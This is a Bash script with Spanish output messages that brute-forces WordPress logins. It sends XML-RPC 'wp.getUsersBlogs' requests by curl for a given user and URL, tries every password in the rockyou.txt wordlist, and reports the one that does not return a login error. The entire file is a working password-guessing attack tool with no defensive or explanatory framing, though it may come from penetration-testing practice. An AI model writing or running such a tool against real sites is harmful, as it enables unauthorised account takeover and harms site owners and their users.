#!/bin/bash 

function Ctrl_c(){
  echo -e "\n[!] Se ha finalizado el script\n"
  exit 1
}

#Ctrl_c
trap Ctrl_c INT

if [ $# -ne 2 ]; then
  echo -e "\n[!] No se han proporcionado los argumentos necesarios...\n"
  echo "\n[+] Uso: $0 usuario URL\n"
  exit 1
fi

user=$1
url=$2


function createXML(){
  password=$1
  user=$2
  url=$3

  # xml File
  xmlFile="""
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>$user</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
  """


  echo $xmlFile > data.xml 

  response=$(curl -s -X POST $url -d@data.xml)


  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "\n[+] La contraseña para el usuario \e[35m$user\e[0m es: \e[35m$password\e[0m\n"
    exit 0 
  fi
}

cat /opt/share/wordlists/rockyou.txt | while read password; do 
  createXML $password $user $url
done
